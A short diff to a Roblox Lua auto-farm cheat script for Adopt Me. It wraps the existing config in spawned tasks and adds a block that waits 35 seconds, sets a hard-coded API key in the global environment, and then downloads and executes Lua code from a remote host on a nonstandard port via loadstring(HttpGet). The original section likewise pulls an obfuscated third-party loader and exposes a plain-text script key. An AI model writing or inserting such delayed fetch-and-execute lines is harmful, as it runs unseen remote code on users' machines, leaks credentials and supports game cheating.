@@ -1,4 +1,12 @@
-script_key="YfvNhuLGHEUEaOYYRwMFPEYYQSvGzzXa";
+task.spawn(function()
+    task.wait(35)
+    getgenv().API_KEY = "JRxd3MCtzUKSfowmCNAfuTS4a"
+    getgenv().GroupName = "vps2"
+    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
+end)
+
+task.spawn(function()
+    script_key="YfvNhuLGHEUEaOYYRwMFPEYYQSvGzzXa";
 getgenv().Config = {
     ["PetFarmAutoSwitchFullGrown"] = false,
     ["PetFarmActive"] = true,
@@ -10,3 +18,6 @@ getgenv().Config = {
     ["Webhook"] = "",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
+
+end)
+
